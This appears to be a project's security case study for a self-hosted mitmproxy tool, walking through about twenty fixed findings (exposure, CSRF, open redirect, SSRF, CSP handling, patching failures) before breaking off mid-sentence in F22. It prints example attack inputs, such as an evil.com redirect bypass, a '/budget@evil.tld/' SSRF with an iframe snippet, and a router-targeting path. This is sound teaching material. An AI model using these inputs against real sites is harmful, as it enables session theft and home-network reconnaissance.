# Security Case Study — Cooldown

A walkthrough of every weakness found in this setup, why it mattered, and how it
was fixed. Written as a learning reference — each finding is
**what it is → how it bit us → impact → the fix → the concept behind it.**

> This is the public copy. Findings are described in the detail needed to learn from them;
> live addresses, configuration and anything directly exploitable stay in the private
> version-controlled copy.

New to any of the words below? *Nonce*, *same-origin*, *least privilege* and the rest are
all explained in plain English in [**CONCEPTS.md**](CONCEPTS.md).

**Scorecard:** 26 findings fixed · 6 risks accepted by design · 626 tests green.

> Every number in that line was wrong before F25 went in — it read *20 · 4 · 378* while the
> document held 24 findings, the accepted list held 6, and the suite ran 577. Nothing tied
> the summary to the thing it summarised, which is F22's lesson wearing a different hat.
> If you edit this file, edit this line.

Findings F1–F5 came from an initial review of the design. **F6–F12 came later, from
auditing the box that was actually running** — which is where the more serious ones were,
and a reminder that reviewing a design is not the same as reviewing a deployment.
**F13–F20 came from a third review of code the first two had already signed off** —
including a HIGH that the design review had every opportunity to catch, and three findings
(F16–F18) sitting in the scripts *around* the app rather than in it. That pass also re-opened
**F9** for the second time; it finally closed by moving the pages to another origin instead
of guarding them with one more header, and it is the most instructive entry here.
**F25 came from a fourth review, and is the bill for F9's fix**: moving the pages to a
second origin solved reading and silently un-did F3/F14's protection against writing,
because the check lived at the proxy and the endpoints no longer passed through it. All
findings are verified live on the box.

---

## First, the trust model

Everything hinges on knowing where your data is encrypted and the one place it isn't:

```
  Your phone  ──WireGuard (encrypted)──▶  ┌──────── plaintext zone ────────┐  ──real TLS──▶  Reddit/YouTube
                                          │  THE BOX: mitmproxy decrypts   │
                                          │  + injects  (holds the CA key) │
                                          └────────────────────────────────┘
```

- **In transit, phone→box is double-encrypted** (your browser's TLS *inside* the
  WireGuard tunnel), so a network eavesdropper sees nothing.
- **The box is a concentration of trust** — it holds the CA key and is the only
  place your data exists in cleartext. Most findings are about protecting *that
  box*, or the code it runs.

---

## F1 — Proxy exposed to the LAN & public IPv6  ·  HIGH  ·  FIXED

**What it is.** mitmproxy listened on `0.0.0.0` and `[::]` (every interface). The
Pi's `eth0` had a LAN address *and* a globally-routable IPv6, and the firewall was
open — so the proxy ports (`8080`/`8081`) were reachable from other LAN devices and
**potentially from the open internet over IPv6.**

```
             BEFORE (open)              AFTER (firewalled to tailscale0)
  Tailscale device   reaches ✓          Tailscale device   reaches ✓
  LAN Wi-Fi device   reaches ✗ (bad)    LAN Wi-Fi device   DROP ✓
  Internet via IPv6  reaches ✗ (bad)    Internet via IPv6  DROP ✓
```

**Impact.** Anyone reaching a port *and* trusting the CA could be MITM'd; an exposed
MITM proxy on the internet is an abuse vector regardless. This kicked off the review.

**The fix.** Interface-scoped firewall rules (IPv4 + IPv6): accept the proxy ports
only on `tailscale0` and loopback, `DROP` everywhere else. Matching by *interface*
(not IP) covers both proxy modes and both IP families in one rule; re-applied on
boot. Verified live: LAN and public-IPv6 went from OPEN to BLOCKED.

**Concept — attack surface & least exposure.** `0.0.0.0` is leaving every door
unlocked because you use one. Bind to the narrowest interface; default-deny at the
firewall. IPv6 is the classic blind spot — people firewall v4 and forget the public
v6 address.

---

## F2 — Open redirect via parser differential  ·  MEDIUM  ·  FIXED

**What it is.** The "return to the link you clicked" feature carried a return URL,
guarded by a same-site check. **Python's `urlparse` and the browser disagree on how
to read a URL**, so a string can look same-site to the check while the browser goes
elsewhere.

```
  Input:  https://evil.com\@reddit.com/

  Python urlparse (the check)        Browser (the reality)
    userinfo = evil.com\               treats "\" as "/"
    host     = reddit.com   ✓ ALLOW    → https://evil.com/@reddit.com/
                                        host = evil.com  → goes to attacker
```

**How it bit us.** Chained with F3 (CSRF), a malicious page could auto-submit a
request that granted a session *and* bounced you to the attacker's site right after
"Enter" — a primed fake-login setup.

**The fix.** Reject the differential-driving characters (backslashes, whitespace,
control chars) and any credential `@` in the authority *before* the host check.
Tested against a bypass corpus; legit links (incl. YouTube `/@handle`) still pass.

**Concept — parser differentials.** When two components parse the same input
differently, the gap is the bug (same root cause as HTTP request smuggling). Don't
reflect user URLs; validate strictly and rebuild from trusted parts.

---

## F3 — CSRF on state-changing endpoints  ·  MEDIUM  ·  FIXED

**What it is.** `/enter`, `/exit`, `/study`, `/heartbeat` were unauthenticated
POSTs with no anti-forgery check, and CORS was a wildcard (`*`). Any site you
visited could fire requests at your gate.

```
  You visit evil.com ──forged POST /budget/enter──▶ [proxy boundary]
                                                     Sec-Fetch-Site: cross-site → 403 ✕
                                                     (never reaches the gate)
```

**Impact.** Could burn your budget / toggle sessions, and — worse — deliver the F2
redirect. Low on its own (it's your state), but the delivery vehicle for F2.

**The fix.** Drop the wildcard CORS (every endpoint is same-origin), and reject
cross-site POSTs to `/budget/*` at the proxy boundary via the browser's
`Sec-Fetch-Site` header. Verified: cross-site → `403`, same-origin passes.
*Incomplete as written — `/exit` is also reachable by `GET`, so this covered it in name
only. Finished in **F14**.*

**Amended 2026-08-12.** Read the parenthetical above again: *"every endpoint is
same-origin"*. That was true when it was written and stopped being true in F9, which moved
five endpoints onto the box's own origin — where the proxy, and therefore this check, never
sees them. The check did not break; it stopped applying. A second copy now runs inside
Flask so the property holds at both doors. See **F25**.

**Concept — CSRF / confused deputy.** CSRF abuses your browser's trust — it attaches
your context to a request another site triggered. Defenses assert intent: anti-CSRF
tokens, `SameSite` cookies, or `Sec-Fetch-*` metadata.

---

## F4 — Substring host matching  ·  LOW  ·  FIXED

**What it is.** Gating asked `"reddit.com" in host` — a *substring* test. True for
`reddit.com`, but also `evil-reddit.com` and `reddit.com.attacker.io`.

```
  host                     substring "in"      suffix (fixed)
  reddit.com               match ✓             match ✓
  www.reddit.com           match ✓             match ✓
  evil-reddit.com          match ✗ (wrong)     no match ✓
  reddit.com.attacker.io   match ✗ (wrong)     no match ✓
```

**Impact.** A look-alike domain would be decrypted and script-injected by your box —
traffic you never meant to touch. Privacy/correctness more than direct compromise.

**The fix.** Suffix match (`host == d or host.endswith("." + d)`) and anchor the
mitmproxy `--allow-hosts` regexes (`^(.+\.)?reddit\.com$`). Verified real sites
still gate.

**Concept — canonicalization & allow-lists.** Identity checks compare *structure*,
not fuzzy text. "Contains" is almost never right for a domain/path/origin. Anchor
and normalize before comparing.

---

## F5 — Development server in production  ·  LOW  ·  FIXED

**What it is.** The app ran on Flask's Werkzeug **dev** server — fine for a laptop,
not for 24/7 duty; its debug console is an RCE vector if ever enabled.

**Why only Low here.** Loopback-only (unreachable from any network) and `debug=False`
— so no RCE console. A robustness/hygiene issue, not an open door.

**The fix.** Swapped in **waitress** (production WSGI), a two-line change. No
behaviour/speed change at single-user scale.

**Concept — dev tooling never ships to prod.** Debuggers/dev servers trade safety
for convenience, and each convenience is attack surface. The Werkzeug debugger is
the textbook debug-feature-becomes-RCE.

---

## F6 — The web app could become root  ·  HIGH  ·  FIXED

**What it is.** Both the Flask app and mitmproxy ran as the login user, which on a
Raspberry Pi has blanket `NOPASSWD: ALL`. The one process listening to the network held
the power to do anything on the box.

**How it bit us.** Nothing exploited it — but the app is the part exposed to hostile
input, and it was one code-execution bug away from full compromise of a machine holding
the CA that decrypts a household's traffic.

**The fix.** Two dedicated system accounts (`cooldownapp`, `cooldownproxy`): no password,
no login shell, not in `sudo`. The app's entire elevated capability is now a single
fully-qualified read pinned in `sudoers.d`. The proxy has none at all. Verified on the box
that both are refused `iptables -F`, `cat /etc/shadow`, `systemctl restart` and a shell.

**The concept — least privilege.** A process should hold the authority its job needs and
not a scrap more. The two accounts are also isolated from each other: the app cannot read
the proxy's CA key, so compromising the web tier does not yield the crown jewel.

---

## F7 — Unauthenticated GET performed privileged firewall writes  ·  HIGH  ·  FIXED

**What it is.** `/feed` rebuilt an `iptables` accounting chain on every request, so an
unauthenticated GET triggered up to ten `sudo` invocations *including writes*.

**How it bit us.** Anything able to reach that endpoint could drive privileged firewall
operations and contend with the redirect service for the iptables lock. Measured at 101 ms
per request — a cheap denial-of-service against the box's own gateway rules.

**The fix.** The chain is created once at boot by the root-run redirect script. The app
now performs exactly one read and has no write path; `grep` for write verbs in the app
returns zero.

**The concept — separate setup from use, and never mutate on a read.** A `GET` that
changes system state is a design error before it is a security one.

---

## F8 — Content-Security-Policy deleted wholesale  ·  MEDIUM  ·  FIXED

**What it is.** To inject its stopwatch the proxy deleted the site's entire CSP — on
*every* response, not just the HTML it injected into.

**How it bit us.** It threw away protections that had nothing to do with script
injection: `frame-ancestors`, `form-action`, `connect-src`. On a site with an XSS bug, the
exfiltration limits that would have contained it were gone — and gone *only for you*.

**The fix.** Two steps. First, strip only on `text/html`, which is the only thing ever
injected into. Then stop stripping at all: add a per-response **nonce** to `script-src`
and leave the rest of the policy enforced. Verified against live Reddit, whose policy is
`default-src 'none'` — it arrives intact, with Reddit's own nonce and ours side by side.

**The trap.** A browser ignores `'unsafe-inline'` the moment a nonce appears. Adding one
blindly to a policy that relies on it would disable the *site's* inline scripts and break
the page. That case is detected and the header left untouched.

**The concept — minimum necessary modification.** Removing a control because it obstructs
you discards every other guarantee it was making. Amend the one rule in the way.

---

## F9 — Monitoring pages readable by any script on a gated site  ·  MEDIUM  ·  FIXED (at the third attempt)

**What it is.** `/budget/stats`, `/health`, `/devices`, `/remaining` and `/feed` are served
on the *gated site's* origin. Any script running on that site — a malicious ad, a
compromised third-party include — is same-origin with them.

**How it bit us.** `fetch('/budget/devices?fmt=json')` from a page on Reddit returned
device names, OS versions, tailnet addresses and traffic volumes. Home-network
reconnaissance, handed to a page the user had chosen to decrypt.

**The first fix — and why it did not hold.** Headers alone can't separate our pages from
the site's: same origin, identical `Sec-Fetch-Site`. So the rule became *allow a real
navigation **or** a token only Cooldown's pages carry* — reasoning that `Sec-Fetch-*` are
forbidden header names a script cannot forge, and that the pages holding the token could
not be fetched by script either, so it could never be harvested. **Both halves of that
were wrong**, and a later review found each independently:

1. **`navigate` does not mean "a person typed this."** The check accepted
   `Sec-Fetch-Dest: document` *or* `Sec-Fetch-Mode: navigate`. A same-origin `<iframe>`
   sends `Dest: iframe, Mode: navigate` — it *is* a navigation, just of a nested browsing
   context — and because it is same-origin, the parent reads the result straight out of
   `contentDocument`. The header was unforgeable, as claimed. It just didn't mean what the
   check assumed it meant.

2. **The gate page carried the master token.** The one page deliberately left
   script-readable — the gate has to render in place of a site — was stamped with the same
   `ui_token` as the monitoring pages. So: `fetch('/budget')`, regex out
   `<meta name="cd-tok">`, replay it anywhere. The token was persisted in Redis, so once
   stolen it stayed stolen across restarts.

```
  a script on reddit.com wants /budget/devices

  fetch()                       Dest: empty     → 403 ✓   the one case the fix was tested against
  <iframe src="/budget/…">      Dest: iframe    → 200 ✗   parent reads contentDocument
  fetch('/budget') → cd-tok     Dest: empty     → 200 ✗   token replayed on every endpoint
```

**The second fix.** Three changes, each closing one assumption:

- **A navigation is `Sec-Fetch-Dest: document`, and only that.** The `Mode: navigate`
  alternative is gone, which drops iframes, `<embed>` and `<object>`.
- **Two tokens, two blast radii.** The gate — script-readable by construction — now carries
  only `feed_token`, which unlocks `/feed` and nothing else: two aggregate bytes-per-second
  numbers, worth nothing to an attacker. `ui_token` exists solely in the monitoring pages,
  which a script genuinely cannot fetch. Compared with `secrets.compare_digest`.
- **Belt and braces on the response.** Flask's real content type is preserved (`/devices?fmt=json`
  was being relabelled `text/html`), plus `nosniff`, `X-Frame-Options: DENY`,
  `frame-ancestors 'none'`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store`.

Verified through the addon: scripted fetch 403, iframe 403, replayed gate token 403 on every
monitoring endpoint, real navigation 200. Pinned by regression tests that fail against the
first fix.

**The third fix — taking the advice.** The second fix left one vector: `window.open` sends
`Dest: document` and stays same-origin, so an ad that captures a single click could still
read those pages. **No header closes that** — the popup is a genuine top-level navigation,
and same-origin means same-origin. Two rounds of increasingly clever header checks were
converging on a wall.

So the pages moved, which is what this finding's own conclusion said to do the first time
round. `/stats`, `/health`, `/devices`, `/remaining` and `/boot-ack` are now served **only
on the box's own origin** (`http://<tailnet-ip>:5000`), never through the proxy. The gate
links to them absolutely; the old `/budget/*` paths return a 302 to the new home so
bookmarks survive. A script on a gated site is now **cross-origin** with them:

```
  BEFORE                                   AFTER
  script on reddit.com                     script on reddit.com
   └─ same-origin with /budget/health       └─ cross-origin with http://box:5000/health
      every read is one header check           fetch      -> no CORS header, response withheld
      away from being allowed                  iframe     -> document not readable
                                               window.open-> window not readable
                                            the BROWSER enforces it, not our header check
```

Supporting changes: Flask binds loopback **plus the tailscale0 address** — never `0.0.0.0`,
so a missing firewall rule is not the only thing between `/devices` and the LAN — and port
5000 joined the interface-scoped rules in `cooldown-redirect.sh` as the outer layer. The gate
keeps `/feed` (its background polls it) with a token that unlocks nothing else, and the set
of endpoints the proxy will serve on a gated origin drops from twelve to eight.

**The bill, recorded 2026-08-12.** This move solved *reading* and quietly un-did the
protection against *writing*. F3's cross-site check lives at the proxy boundary; the five
endpoints that moved no longer pass through it, so from this commit until F25 any web page
could POST to them. Moving to the safe side of a boundary you don't own also moves you out
from behind the controls you built on the old one. See **F25**.

Verified live: all four dashboard paths return 302 for `Dest: empty`, `iframe` **and
`document`** — including the shape no header could have caught — while the dashboard answers
200 on the box's own origin with no `Access-Control-Allow-Origin` anywhere in sight.

**The concept — when the fix keeps needing another patch, the design is the bug.** Three
lessons, in increasing order of what they cost.

First: injecting your own endpoints into a site you don't control means its scripts inherit
access to them. Same-origin is a boundary the browser enforces *for* you — and adding pages
to someone else's origin puts you on the wrong side of it.

Second: the original fix was tested against exactly the attack that motivated it — `fetch()`
— and passed, which made it look finished. An unforgeable signal is only as good as your
reading of what it signals, and a secret is only secret if *every* page carrying it is
protected. Test the assumption a control rests on, not just the attack you already know.

Third, and the one worth the most: **the first fix already named the right answer** — "prefer
a separate origin; if you can't, require something a script cannot produce" — and then took
the second clause, because it was the cheaper one. Two rounds of header cleverness later,
the answer was still the first clause. When a mitigation needs a special case for iframes,
then another for popups, that is not a series of small bugs; it is the design telling you it
cannot hold. Rebuilding a boundary by hand loses to moving to the side of it that already
has one.

---

## F10 — SSH accepted passwords from the whole LAN  ·  HIGH  ·  FIXED

**What it is.** `sshd` listened on `0.0.0.0:22` with `PasswordAuthentication yes` and no
firewall rule — while the proxy ports right next to it were carefully restricted to the
tailnet.

**How it bit us.** Anyone on the home network — a guest, a compromised IoT device, someone
with the wifi password — could brute-force the account whose box holds the CA. Every other
control in this document is downstream of that.

**The fix.** Key-only via a drop-in (`PasswordAuthentication no`,
`KbdInteractiveAuthentication no`, `PermitRootLogin prohibit-password`), applied only after
confirming key auth worked, validated with `sshd -t`, reloaded rather than restarted, and
proved from a *new* connection before trusting it.

**The concept — inventory every listener, not just the interesting ones.** The proxy ports
got attention because they were the novel part. `sshd` was old and boring and wide open.

---

## F11 — No automatic patching  ·  MEDIUM  ·  FIXED

**What it is.** An always-on internet-facing box with **18 pending security updates** and
`unattended-upgrades` not installed.

**How it bit us.** The pending set included `gnutls`, `libgcrypt`, `krb5` and `dnsmasq` —
the TLS and DNS libraries this machine's entire job depends on.

**The fix, as first written.** Applied (18 → 0) and enabled automatic security upgrades.
Auto-reboot deliberately left **off**: a gateway restarting itself would drop every routed
device.

**Reopened 2026-08-10, because that fix did not work.** Two separate defects, neither of
which announced itself:

- **The origins were wrong.** Enabling `unattended-upgrades` left Debian's stock
  `Origins-Pattern`, which allows `origin=Debian` only. On a Raspberry Pi that silently
  excludes the kernel, the firmware, `rpi-eeprom` — and `tailscaled`, the daemon the box's
  remote access and firewall scoping depend on. "Automatic security updates are on" was
  true and largely useless.
- **It then stopped running entirely for eleven days** (see F22) and nothing reported it.

**The fix now.** Origins widened to the Raspberry Pi and Tailscale repositories.
`needrestart` in automatic mode, because patching a library on disk does nothing for a
process that already has the old copy mapped — openssl gets fixed and the proxy keeps
serving with the vulnerable one loaded. And **auto-reboot switched ON** at 04:00, reversing
the original call: kernels cannot take effect without one, and the argument against ("a
gateway restarting drops every routed device") is only true while a device is routed —
at 4am the only one is a phone nobody is holding. Upgrades moved to 03:00 so a required
reboot lands in the same night window.

One thing that turned out to be untrue in the other direction: `unattended-upgrades` 2.12
has **no dist-upgrade capability at all** (`grep -c "Dist-Upgrade"` on the binary returns
zero), so it can never install a kernel that requires a new versioned package — which is
every kernel bump. Widening the origins was necessary and not sufficient; the first kernel
went in by hand.

**The concept — enabling a thing is not the same as it working.** Every visible signal said
this was handled: the package was installed, the timers were enabled and active, the config
said `"1"`. The box had not patched itself in eleven days. Nothing here was caught by
checking whether the feature was switched on; it was caught by asking what it had actually
*done* lately, which nothing was doing.

---

## F12 — Worker starvation silently stopped the clock  ·  LOW  ·  FIXED

**What it is.** `/health` slept 0.2 s inside the request to sample CPU, holding one of only
four server threads; the injected heartbeat swallows its own errors.

**How it bit us.** Saturating the pool made heartbeats fail — and because failures are
silent by design, **time stopped being charged while browsing continued**. A security-ish
failure of the tool's actual purpose, reachable by the same-origin scripts of F9.

**The fix.** CPU is sampled *between* calls instead of by sleeping, `/health` is cached,
and the pool is larger. Measured 340 ms → 39 ms per request.

**Amended 2026-08-11.** Sampling between calls fixed the starvation but left the readings
dishonest: the percentage covered "however long since the last HTTP request", a different
window every time, and history was only recorded while somebody had the page open. Arrive
after a gap and the chart began from nothing. Sampling now runs on the scheduler at a fixed
4 s and is the sole caller of `_cpu_stats()` — a second caller landing a fraction of a
second after the first would diff over a near-zero interval and report noise. A monitor
that only monitors while observed is not a monitor.

**The concept — fail loudly, or fail safe.** Silent failure in the enforcement path is
indistinguishable from success.

---

## F13 — A URL path could redirect the proxy's internal call off the box  ·  HIGH  ·  FIXED

**What it is.** The addon serves the gate from any gated host's `/budget` path. It decided
that with `path.startswith("/budget")`, then built the internal call by pasting the rest of
the path onto the Flask address:

```python
sub = parts.path[len("/budget"):]
resp = req.get(f"http://127.0.0.1:5000{sub}")
```

Ask for `/budget@evil.tld/` and that string becomes `http://127.0.0.1:5000@evil.tld/`.
Every URL parser reads `127.0.0.1:5000` there as **userinfo** — a username and password —
not as the host. The host is `evil.tld`.

```
  http://127.0.0.1:5000@evil.tld/
         └──userinfo──┘ └─host─┘     "@" ends the userinfo — everything before
                                      it is a username, not an address
```

**How it bit us.** Worse than it first looks, because of *where the answer is served*. The
proxy fetched the attacker's page and handed the body back as `text/html` **on the gated
site's own origin** — and since the proxy synthesises that response itself, none of the real
site's headers (framing, CSP) come with it. So:

```html
<!-- on ANY website in the world -->
<iframe src="https://www.reddit.com/budget@evil.tld/"></iframe>
```

renders attacker HTML with the origin `https://www.reddit.com`. No user interaction, nothing
to click. Script in it reads `document.cookie` and makes authenticated same-origin calls to
Reddit as you — and the same URL works for youtube.com, open.spotify.com and every one of the
~95 news domains. Pointing it inward instead (`/budget@192.168.1.1/`) makes the Pi fetch your
router's admin page and hand it to the browser: the same bug is also an SSRF into the network
the box sits on.

The irony is that this is F4 again, one layer along. `site_for_host` was carefully taught to
match hosts by suffix rather than substring — and then the *path* was matched with
`startswith` and concatenated raw.

**The fix.** Two changes, neither of them a filter:

- **Match the path exactly** — `== "/budget"` or `startswith("/budget/")`. As a bonus,
  `reddit.com/budgeting` is Reddit's own page again; it used to be swallowed by this handler
  and returned a 500.
- **Refuse anything outside a closed set of endpoints** *before* a URL is built. There are
  seventeen Flask routes and they are all known at import time, so nothing attacker-shaped is
  ever concatenated onto the base address.

Verified against the addon with mitmproxy's flow harness — before: attacker HTML returned
with `Content-Type: text/html` for `www.reddit.com`; after: the request never leaves
`127.0.0.1:5000`. The regression test asserts that invariant directly (every outbound URL
must still resolve to host `127.0.0.1`, port 5000) rather than checking a status code, so it
keeps holding for inputs nobody has thought of yet.

**The concept — never build a URL by concatenation, and don't trust a prefix to be a
boundary.** `"/budget" + attacker_string` is the same class of mistake as `"SELECT … " + input`:
the attacker supplies syntax, not just data, and `@` is syntax. Validate against a closed set
of known-good values, then construct from *those* — the safe version of this code never sees
the attacker's string at all. And note which check failed: `startswith` said "this path is
mine" when it meant "this path begins with my name."

---

## F14 — CSRF protection keyed to the method, not the effect  ·  LOW  ·  FIXED

**What it is.** F3 blocked cross-site **POSTs** to `/budget/*`. But `/exit` also accepts
`GET`, because the study-mode exit button is an ordinary navigation
(`window.location.assign("/budget/exit?site=youtube")`) rather than a form.

**How it bit us.** `<img src="https://www.reddit.com/budget/exit?site=reddit">` on any page
you visit ends your active session. Genuinely minor — it makes the gate *stricter*, not
looser, and you re-enter with one tap — but it is a hole in a control whose stated scope was
"the mutating endpoints," and the next endpoint someone exposes to `GET` might not be so
harmless.

**The fix.** The check now covers any request to a state-changing endpoint, not just POSTs:
`/enter`, `/study`, `/exit`, `/heartbeat`, `/reflect`, `/worth`. The endpoint list is the
same closed set F13 introduced, so the two fixes hold each other up.

**Corrected 2026-08-12.** That list read `/boot-ack` where it should have read `/worth`,
and stayed wrong through two reviews. `/boot-ack` moved to the box's origin in F9 and was
therefore covered by *nothing* — while this sentence said it was covered, which is exactly
the kind of clearance that stops the next reader looking. `/worth` was added later and never
recorded here. Both are true now, by different mechanisms: `/worth` by the proxy check
described above, `/boot-ack` by the box-side check in **F25**.

**The concept — CSRF is about the effect, not the verb.** "Only POSTs change state" is a
convention, not a guarantee, and the moment one `GET` breaks it the defence has a hole
shaped exactly like that endpoint. Enumerate what changes state and defend *that*; letting
the HTTP method stand in for the answer is how the exception gets missed.

---

## F15 — Every proxied response was relabelled `text/html`  ·  LOW  ·  FIXED

**What it is.** The addon rebuilt each `/budget` response with a hardcoded
`Content-Type: text/html; charset=utf-8`, discarding whatever Flask had said. So
`/devices?fmt=json`, `/health?fmt=json` and `/feed` — real JSON — were delivered to the
browser labelled as HTML, with no `nosniff` and nothing preventing them being framed.

**How it bit us.** Latent rather than exploited, and worth stating plainly: the values in
those payloads (Tailscale hostnames, `/proc/device-tree/model`) are DNS-safe in practice, so
there is no known way to get markup into them today. The finding is the *distance* to a bug,
not a bug: a response mislabelled as HTML is a stored-XSS sink the moment any field in it
becomes attacker-influenced, and there was no `nosniff` behind it as a second line. The
missing framing headers also mattered concretely — they're part of why F9's iframe read
rendered at all.

**The fix.** Preserve Flask's own `Content-Type`, and set the headers that cost nothing:
`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`,
`Content-Security-Policy: frame-ancestors 'none'`, `Referrer-Policy: no-referrer`,
`Cache-Control: no-store`.

**The concept — a content type is a security control, not metadata.** It tells the browser
which parser to hand your bytes to, and "HTML" is the parser that executes things. Declare
what a response actually is, add `nosniff` so the browser doesn't get creative, and set the
free headers *before* you need them — the bug they defend against is usually written after
the header was skipped.

**A note added 2026-08-14.** Two of those five headers have since been dropped from
Cooldown's own responses, keeping `X-Frame-Options: DENY`,
`Content-Security-Policy: frame-ancestors 'none'` and `Referrer-Policy: no-referrer`.
`nosniff` and `Cache-Control: no-store` were removed once the responses they guarded were
no longer served the way they had been. The reasoning above still holds for the headers
that remain, and "set the free headers before you need them" is still right — but a header
kept after its reason has gone is a claim the code no longer earns, which is the same
defect as a stale exemption in an allowlist.


---

## F16 — The dev script quietly undid two fixes  ·  MEDIUM  ·  FIXED

**What it is.** `start.sh` — the "just run it locally" convenience script — invoked
mitmdump with none of the flags the systemd unit is careful about:

```
  unit                                    start.sh (before)
  --allow-hosts "<gated hosts only>"      (absent)  -> decrypts EVERY site you visit
  --set confdir=/var/lib/.../mitmproxy    (absent)  -> generates a SECOND CA in ~/.mitmproxy
  listener firewalled to tailscale0       (absent)  -> mitmproxy's default bind: 0.0.0.0
```

**How it bit us.** Running it turned the machine into an intercepting proxy for the whole
internet, on every interface, under a certificate authority nobody was tracking — F1 and F5
undone in a single command, by the file most likely to be run by someone trying the project
out. The hardened path and the convenient path disagreed, and the convenient one wins.

**The fix.** Rewritten: same `--allow-hosts` from the same generator the unit uses,
`--listen-host 127.0.0.1`, and a clearly-labelled dev CA in a gitignored `.mitmproxy-dev/`
(deliberately *not* the deployed one, which is mode 700 and owned by another account). It
also refuses to start if the real services are running, instead of silently racing them for
port 5000.

**The concept — the convenient path is the real configuration.** Hardening the production
launcher does nothing if a friendlier script next to it skips the flags. Every way to start
the thing is a deployment; audit them all, or delete the ones you don't want people using.

---

## F17 — Deploy staged root-installed files in /tmp  ·  LOW  ·  FIXED

**What it is.** `deploy.sh units` `scp`'d systemd unit files to `/tmp/cooldown-*.service` on
the Pi, then ran `sudo install` on them into `/etc/systemd/system/`.

**How it bit us.** `/tmp` is world-writable and the names were predictable, so any local
unprivileged account on the box could swap a file between the copy and the install — and
what gets installed is a systemd unit that runs as root. A narrow race on a single-user box,
which is why it's LOW, but the payoff is a root shell.

**The fix.** Stage in a `mktemp -d` directory (0700, unguessable name), install from there,
and clean up via a trap so a failed run doesn't leave the staging dir behind.

**The concept — predictable paths in shared directories are a handoff an attacker can
intercept.** Anywhere a privileged process reads a file an unprivileged one could have
written is a TOCTOU. The fix is never a check; it's a location only you can write to.

---

## F18 — The asset exemption list still matched by substring  ·  LOW  ·  FIXED

**What it is.** F4 fixed substring host matching in `site_for_host`. The *exemption* list
next to it — `IGNORED_HOSTS`, the CDN hosts deliberately let through ungated — kept the old
`any(ignored in host ...)` test.

**How it bit us.** `redd.it` is a substring of `redd.it.evil.example`. Contained by
`--allow-hosts` in practice, so latent rather than live — but note the direction: an
over-matching *gate* wrongly decrypts a site, while an over-matching *exemption* wrongly
lets one through. The exemption list fails toward not doing its job.

**The fix.** One `host_matches(host, patterns)` helper does suffix matching (plus port and
case normalisation), and all three call sites — gated hosts, overlay hosts, ignored hosts —
go through it. There is no longer a second place to get this wrong.

**The concept — fix the pattern, not the instance.** F4 fixed the line that had the bug.
The same bug six lines further down survived another two reviews because nobody went
looking for *other* callers. When you fix a class of mistake, grep for the class.

---

## F19 — The installer advertised a dashboard URL that could not work  ·  LOW  ·  FIXED

**What it is.** The installer's closing instructions offered `http://<this-box>:5000/stats`
while the app bound `127.0.0.1` only — reachable from nowhere but the box itself.

**How it bit us.** Not an exploit; a trap. The obvious way to make the documented URL work
is to bind `0.0.0.0`, which hands every monitoring page — device names, tailnet addresses,
usage history — to the LAN and to any public IPv6 address, unauthenticated. Documentation
that only works if you weaken something is a vulnerability with a delay on it.

**The fix.** The URL is now true: F9's origin move binds the tailnet address deliberately,
behind an interface-scoped firewall rule, and the installer prints the address the app
actually listens on.

**The concept — wrong docs get "fixed" by users, in the worst available way.** A README that
disagrees with the code is a standing invitation to change the code. Make the instruction
true, or delete it.

---

## F20 — CSP: the check read a directive the browser wouldn't  ·  LOW  ·  FIXED

**What it is.** F8's nonce logic decided whether our injected script was already permitted by
reading `script-src`, falling back to `default-src`. Browsers resolve an inline `<script>`
**element** against `script-src-elem` first, and only then `script-src`.

```
  Policy:  script-src 'unsafe-inline'; script-src-elem 'self'

  our check  -> reads script-src, sees 'unsafe-inline' -> "already allowed", policy untouched
  browser    -> reads script-src-elem 'self'           -> inline script BLOCKED
```

**How it bit us.** No heartbeat on such a site. And the heartbeat swallows its own errors by
design, so nothing surfaces: **time silently stops being charged while browsing continues.**
Not a breach — a failure of the thing the tool exists to do, in the fail-open direction, and
the same shape as F12 reached by a different route.

**The fix.** Pick the directive the browser will actually consult —
`script-src-elem` → `script-src` → `default-src` — and add the nonce there. Tests cover all
four shapes, including "leave it alone, their `unsafe-inline` already covers us."

**The concept — model the spec's precedence, not the directive you remember.** A check that
reads a *different* input than the enforcer is not a weak check, it's a decorative one. And
when the failure mode is silent and fails open, nobody reports it — you only find it by
reading the spec against the code.

---

## F21 — Boot never completed, so scheduled work queued for eleven days  ·  HIGH  ·  FIXED

**What it is.** `userconf-pi` sat on tty1 showing "Please enter new username" from the
2026-07-30 boot onward. cloud-init never answered it — its config had failed schema
validation — so `multi-user.target` was **never reached**, and every job ordered behind it
queued forever. `apt-daily.service` among them.

**How it bit us.** The box stopped patching itself for eleven days. Every signal read
healthy: services active, timers `enabled` and `active`, `systemctl status` reporting
"active (running)". The only visible tell anywhere was `Trigger: n/a`, and
`NextElapseUSecRealtime` being empty on a timer nobody thinks to interrogate.

**How it was misdiagnosed, which is the more useful half.** The first explanation was a
stale `Persistent=` elapse point caused by the Pi's missing RTC — a coherent, plausible
mechanism fitted to the symptom, committed to two repositories, and wrong. The fix that
followed cleared the timers' stamp files, which made them report a healthy next elapse
while changing nothing: the jobs still had nowhere to run. **A fix that makes the dashboard
look better without moving the underlying state is worse than no fix**, because it also
retires the question.

**The fix.** `userconfig.service` stopped and masked; `multi-user.target` reached in 14 s
on the next boot for the first time in eleven days. The watchdog now checks that jobs
**execute**, not merely that timers are scheduled: `multi-user.target` active, count of
jobs stuck in `waiting`, and per-timer last-trigger against the service's last actual
start. The original watchdog verified only that a next elapse existed — true throughout
the entire outage — and would have reported all-clear every hour for eleven days.

**The concept — a scheduled timer proves nothing about execution.** Two independent things
have to be true for periodic work to happen, and only one of them is what everybody checks.

---

## F22 — SSH was open to the LAN while the dashboard said it was firewalled  ·  MEDIUM  ·  FIXED

**What it is.** The interface-scoped firewall rules covered TCP 5000, 8080 and 8081. Port
22 was not in the list. `/health` displayed it as firewalled, from a hardcoded set in
`app.py`.

**How it bit us.** `sshd` listened on `0.0.0.0:22` and `[::]:22`, reachable from any device
on the LAN — verified by connecting to it. Mitigated in practice by key-only
authentication (`passwordauthentication no`), so brute force was never viable; the real
defect was a dashboard asserting a control that did not exist, which is how a gap stays
unexamined.

**The fix.** 22 added to the scoped port list, so it answers on `tailscale0` and loopback
only. The claim in `app.py` is now true rather than aspirational. Applied behind a
six-minute timer that would have removed the DROP rule if the connection was lost, and
verified from both sides before disarming.

**Trade-off, taken deliberately.** This removes the LAN fallback: if `tailscaled` fails,
recovery needs a monitor and keyboard. That made the node's key expiry load-bearing, which
the audit now watches.

**The concept — a control you display is a claim you have to keep true.** The hardcoded set
